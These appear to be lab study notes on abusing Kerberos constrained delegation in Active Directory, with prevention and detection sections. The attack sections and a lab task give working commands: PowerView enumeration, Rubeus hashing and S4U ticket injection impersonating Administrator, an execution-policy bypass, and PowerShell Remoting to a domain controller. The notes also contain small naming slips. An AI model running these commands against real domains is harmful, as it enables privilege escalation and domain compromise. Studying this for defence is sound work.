# Kerberos  Constrained Delegation

Kerberos Delegation allows a service (like a web server) to access resources on another server (like a database) on behalf of a user. This way, the web server itself doesn't need direct access—access is made using the user's permissions.

There are **three types of delegation** in Active Directory:

1. **Unconstrained Delegation** – Most permissive. The service can access _any_ resource on behalf of a user.
2. **Constrained Delegation** – More secure. The service can only access _specific_ resources, as defined by the admin.
3. **Resource-Based Constrained Delegation** – The _target_ resource (like the database server) decides which services it trusts to delegate access.

**Important:** Delegation can pose security risks. It should only be used when truly necessary.\
Unconstrained and Constrained delegations are more common in production. Resource-based delegation is rarer but often abused by attackers.

***

## Attack

We will only showcase the abuse of `constrained delegation`; when an account is trusted for delegation, the account sends a request to the `KDC` stating, "Give me a Kerberos ticket for user YYYY because I am trusted to delegate this user to service ZZZZ", and a Kerberos ticket is generated for user YYYY (without supplying the password of user YYYY). It is also possible to delegate to another service, even if not configured in the user properties. For example, if we are trusted to delegate for `LDAP`, we can perform protocol transition and be entrusted to any other service such as `CIFS` or `HTTP`.

To demonstrate the attack, we assume that the user `web_service` is trusted for delegation and has been compromised. The password of this account is `Slavi123`.

1.

To begin, we will use the `Get-NetUser` function from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to enumerate user accounts that are trusted for constrained delegation in the domain:

### See deligated accounts

```powershell-session
PS C:\Users\bob\Downloads> Get-NetUser -TrustedToAuth
```

<figure><img src="../../../.gitbook/assets/Pasted image 20250414102458.png" alt=""><figcaption></figcaption></figure>

We can see that the user `web_service` is configured for delegating the HTTP service to the Domain Controller `DC1`. The HTTP service provides the ability to execute `PowerShell Remoting`. Therefore, any threat actor gaining control over `web_service` can request a Kerberos ticket for any user in Active Directory and use it to connect to `DC1` over `PowerShell Remoting`.

Before we request a ticket with `Rubeus` (which expects a password hash instead of cleartext for the `/rc4` argument used subsequently), we need to use it to convert the plaintext password `Slavi123` into its `NTLM` hash equivalent

### Convert pass to hash

```powershell-session
PS C:\Users\bob\Downloads> .\Rubeus.exe hash /password:Slavi123
```

<figure><img src="../../../.gitbook/assets/Pasted image 20250414102616.png" alt=""><figcaption></figcaption></figure>

Then, we will use `Rubeus` to get a ticket for the `Administrator` account

### S4U (Services-for-User) Kerberos delegation command

```powershell-session
PS C:\Users\bob\Downloads> .\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
```

To confirm that `Rubeus` injected the ticket in the current session, we can use the `klist` command

### Confirm ticket injection

```powershell-session
PS C:\Users\bob\Downloads> klist
```

<figure><img src="../../../.gitbook/assets/Pasted image 20250414102731.png" alt=""><figcaption></figcaption></figure>

With the ticket being available, we can connect to the Domain Controller impersonating the account `Administrator`

### Connect to dc1

```powershell-session
PS C:\Users\bob\Downloads> Enter-PSSession dc1
[dc1]: PS C:\Users\Administrator\Documents> hostname
DC1
[dc1]: PS C:\Users\Administrator\Documents> whoami
eagle\administrator
[dc1]: PS C:\Users\Administrator\Documents>
```

If the last step fails (we may need to do `klist purge`, obtain new tickets, and try again by rebooting the machine). We can also request tickets for multiple services with the `/altservice` argument, such as `LDAP`, `CFIS`, `time`, and `host`.

***

## Prevention

Fortunately, when designing Kerberos Delegation, Microsoft implemented several protection mechanisms; however, it did not enable them by default to any user account. There are two direct ways to prevent a ticket from being issued for a user via delegation:

* Configure the property `Account is sensitive and cannot be delegated` for all privileged users.
* Add privileged users to the `Protected Users` group: this membership automatically applies the protection mentioned above (however, it is not recommended to use `Protected Users` without first understanding its potential implications).

***

## Detection

* One of the best ways to spot abuse of constrained delegation is by monitoring user behavior. If you know where and when a user normally logs in, you can detect unusual activity—for example, the ‘Administrator’ logging in from an unexpected location.
* In secure setups using Privileged Access Workstations (PAWs), any privileged user logging in from a non-PAW machine should raise a red flag. Look for **event ID 4624** (successful logon) in the logs.
* Sometimes, logon events using delegated tickets include a **"Transited Services"** field, showing where the ticket came from. This usually appears during **S4U (Service For User)** logons—a Microsoft Kerberos extension that allows a service to request a ticket on behalf of a user.
* In attacks (e.g., using _Rubeus_), S4U is often used to impersonate a user (like ‘Administrator’) and access other systems like the Domain Controller.

***

## Tasks

### Task 1

Use the techniques shown in this section to gain access to the DC1 domain controller and submit the contents of the flag.txt file.

RDP to the user bob with the password Slavi123.

```
xfreerdp /u:eagle\\bob /p:Slavi123 /v:TARGET_IP /dynamic-resolution
```

Open PS

**bypasses PowerShell's script execution policy**, allowing **any script** to run **without warning or prompt**

```
powershell -exec bypass
```

load a script file (`PowerView-main.ps1`) as a module so that you can use the functions and commands defined within it.

```
Import-Module PowerView-main.ps1
```

**Enumerates user accounts that are trusted for delegation across domains**, specifically accounts where TrustedToAuthForDelegation = True

```
Get-NetUser -TrustedToAuth
```

get the hash for the password for user bob because rebeus only works with hashes

```
.\Rubeus.exe hash /password:Slavi123
```

copy the hash and paste in the /rc4 argument to inject the ticket to impersonate the **Administrator** user.

```
.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
```

Ckech if the ticket is injected in the session

```
klist
```

Connect to DC1

```
Enter-PSSession dc1
```

Check the docs and view the flag.txt

```
dir
cat flag.txt
```

video
